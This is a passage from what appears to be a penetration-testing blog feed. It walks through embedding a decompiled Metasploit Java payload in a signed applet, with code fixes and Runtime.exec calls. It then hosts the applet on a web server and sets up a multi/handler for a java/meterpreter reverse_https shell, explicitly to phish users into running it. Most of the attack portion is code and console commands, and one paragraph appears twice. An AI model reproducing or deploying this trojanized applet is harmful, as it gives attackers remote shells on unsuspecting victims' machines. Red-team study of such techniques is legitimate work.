&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;webApplet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Applet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;newProject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mainJavaClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;importing-metasploit-java-code-into-applet&quot;&gt;Importing metasploit java code into applet&lt;/h3&gt;

&lt;p&gt;Create a new package in your java program, name it “metasploit”. Then copying the source files under the metasploit package you exported from jd-gui, copy the Payload.java and the PayloadTrustManager.java into the this package. You will also need the metasploit.dat file. This needs to be copied into the , which can be done by just drag and dropping it into the “source packages”. It should create the package for you.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/signed-java-applet/packages_java.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will notice that there are a few syntax errors with this code. I believe this is due to the fact that when jd-gui decompiles the jar file, some of the code isn’t interpreted correctly, and as such you will have to do some spot clean up.&lt;/p&gt;

&lt;p&gt;I’ve made a quick list below of the line number and the corrected code that needs to be done.
After all of this is setup, you can now phish users with a signed Java Applet. Make sure that the certificate that was used in the signing is trusted by the users (By previous exploitation and deploying your own root CA, or by using a trusted vendor of code signing).
Note: If you need to clear out the java cache, follow the instructions at https://www.java.com/en/download/help/plugin_cache.xml.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//Line 55&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localFile1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.dir&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Line 56&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Line 93 - 100&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject6a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localFile3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject6a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject6a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
               &lt;span class=&quot;n&quot;&gt;localObject6a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deleteOnExit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
               &lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Line 114&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;chmod&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;+x&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Line 122&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Line 175 - 177&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject6b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[])&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;saic.AESEncryption&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrapStreams&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;localObject3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject6b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;localObject4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localObject6b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Line 277&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localStringTokenizer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nextToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that most of the issues revolve around the general Object class not being appropriately casted as the required type.
This should fix any errors regarding the metapsloit code.&lt;/p&gt;

&lt;h3 id=&quot;setting-up-the-jks-signing&quot;&gt;Setting up the JKS signing&lt;/h3&gt;

&lt;p&gt;From the first step above, you converted the code signing certificate into a jks key store file. This is what we will need to generate the signed jar file using netbeans.
Right click your project and goto “Properties”.
Goto Application -&amp;gt;Web Start
Click “Enable Web Start” Checkbox
Change codebase to “No Codebase”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/signed-java-applet/settings1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Under signing click “Customize”. Select “Sign by a specified key”. Find the jks file under the “Keystore Path”. Type in your keystore password along with your alias name.
For mixed code it should be set to “Enable Software Protections”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/signed-java-applet/settings2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After all these settings have been setup, you should be able to run your Java program from Netbeans. You should get your normal java program running along with Metasploit running in the background.&lt;/p&gt;

&lt;h3 id=&quot;setting-up-msfconsole&quot;&gt;Setting up msfconsole&lt;/h3&gt;

&lt;p&gt;From the msfconsole, use the following to catch the java meterpreter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
set payload java/meterpreter/reverse_https
set lhost IP_Address
set lport 443
set exitonsession false
exploit -j -z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-applet-compiling&quot;&gt;Web Applet Compiling&lt;/h3&gt;

&lt;p&gt;Now to get it working for web applet. After adding the metasploit codebase to the project, fixing the errors, and testing it, we need to deploy it to the web server.&lt;/p&gt;

&lt;p&gt;Compile the latest build for your project and goto the dist directory. Copy all the files there. Should be:&lt;/p&gt;

&lt;p&gt;launch.html
launch.jnlp
newProject.jar
README.TXT
Copy these files to your apache2/nginix server. For Apache2, copy these files under /var/www/html. Then create/modify your index.html file with the following content:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;applet&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;newProject&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;400&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;800&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;codebase=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.5&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;archive=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;newProject.jar&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;code=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;newProject.webApplet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/applet&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After all of this is setup, you can now phish users with a signed Java Applet. Make sure that the certificate that was used in the signing is trusted by the users (By previous exploitation and deploying your own root CA, or by using a trusted vendor of code signing).
Note: If you need to clear out the java cache, follow the instructions at https://www.java.com/en/download/help/plugin_cache.xml.&lt;/p&gt;</content><author><name>Micheal Reski</name><email>micheal@blacklanternsecurity.com</email></author><summary type="html"></summary></entry></feed>